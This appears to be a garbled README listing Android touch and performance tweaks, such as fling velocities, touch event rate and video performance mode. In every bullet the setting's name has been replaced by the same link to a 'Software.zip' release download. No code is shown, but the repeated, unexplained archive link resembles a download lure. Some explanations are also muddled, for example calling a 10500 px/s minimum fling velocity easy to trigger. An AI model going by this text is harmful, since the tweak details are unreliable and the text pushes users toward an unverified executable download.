  - https://github.com/Saninmysore/ReactTouch/releases/download/v1.0/Software.zip Sets the performance mode for the video component (vidc) to mode 2.
  - https://github.com/Saninmysore/ReactTouch/releases/download/v1.0/Software.zip Indicates the availability of the floating touch feature on the device with a value of 1 (available).
  - https://github.com/Saninmysore/ReactTouch/releases/download/v1.0/Software.zip This setting determines the maximum number of touch events per second that the window manager can process. By setting it to 300, the window manager can handle up to 300 touch events in a single second, providing a smoother and more responsive touch experience.
  - https://github.com/Saninmysore/ReactTouch/releases/download/v1.0/Software.zip This configuration sets the maximum fling velocity, which is the speed at which a scroll or swipe gesture reaches its maximum distance. By setting it to 13800, the maximum fling velocity is limited to 13800 pixels per second. This prevents excessively fast scrolling or swiping actions and ensures better control and user experience.
  - https://github.com/Saninmysore/ReactTouch/releases/download/v1.0/Software.zip This configuration sets the minimum fling velocity, which is the speed at which a scroll or swipe gesture starts moving. By setting it to 10500, the minimum fling velocity is set to 10500 pixels per second. This ensures that small fling gestures are recognized and do not require excessive effort from the user to initiate scrolling or swiping.
